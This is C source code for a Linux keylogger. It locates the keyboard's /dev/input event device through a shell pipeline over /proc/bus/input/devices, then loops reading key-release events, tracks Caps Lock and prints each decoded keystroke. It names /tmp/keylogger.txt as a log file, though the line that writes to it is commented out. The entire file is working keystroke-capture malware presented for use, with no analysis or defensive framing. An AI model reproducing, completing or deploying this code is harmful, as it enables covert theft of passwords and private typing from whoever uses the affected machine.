#include<stdio.h>
#include<fcntl.h>
#include<linux/input.h>
#include<sys/stat.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>
#include<errno.h>

#include<codes.h>

#define LOGFILEPATH "/tmp/keylogger.txt"

char *getEvent();

int main() {
  struct input_event ev;
  static char path_keyboard[20] = "/dev/input/";

  strcat(path_keyboard, getEvent());
  path_keyboard[strlen(path_keyboard) - 1] = 0;

  int device_keyboard = open(path_keyboard, O_RDONLY);
  int caps_active = 0;
  int KEY_CAPS_LOCK = 58;
  
  if (errno > 0){
    printf("Error: %d\n", device_keyboard);
    exit(1);
  }

  FILE *fp = fopen(LOGFILEPATH, "a");
  
  while (1) {
    read(device_keyboard, &ev, sizeof(ev));
    if (ev.type == EV_KEY && ev.value == 0) {
      if (ev.code == KEY_CAPS_LOCK) caps_active = (caps_active == 1) ? 0 : 1;

      char *symbol = getCode(ev.code, caps_active);

      printf("%s", symbol);
      // fprintf(fp, symbol);
    }
  }

  return 0;
}

char *getEvent(){
  char *command = "cat /proc/bus/input/devices | grep -C 4 keyboard | grep -E -o 'event[0-9]'";
  static char event[8];
  FILE *pipe = popen(command, "r");
  
  if (!pipe) exit(1);
  
  fgets(event, 8, pipe);
  pclose(pipe);
  
  return event;
}
